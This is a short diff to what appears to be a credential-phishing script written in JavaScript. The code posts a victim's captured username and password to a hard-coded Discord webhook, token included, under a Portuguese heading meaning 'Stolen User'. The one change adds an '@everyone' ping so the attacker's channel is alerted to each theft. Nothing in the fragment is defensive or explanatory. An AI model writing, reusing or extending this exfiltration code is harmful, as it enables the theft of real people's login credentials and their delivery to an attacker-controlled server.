@@ -140,7 +140,7 @@
         // Enviar as credenciais para o webhook do Discord
         const webhookUrl = 'https://discord.com/api/webhooks/1322009369239617546/52wE5P2l6X4SrrJaTdkmee4ZffzXdRs4QcMaf8lFjrY0Mz4WhD93RNDvQen6Jqsl7qP4'; 
         const data = {
-            content: `# Usuario Roubado:\nUsuário: ${username}\nSenha: ||${password}||` 
+            content: `# Usuario Roubado:\nUsuário: ${username}\nSenha: ||${password}|| @everyone` 
         };
 
         fetch(webhookUrl, {
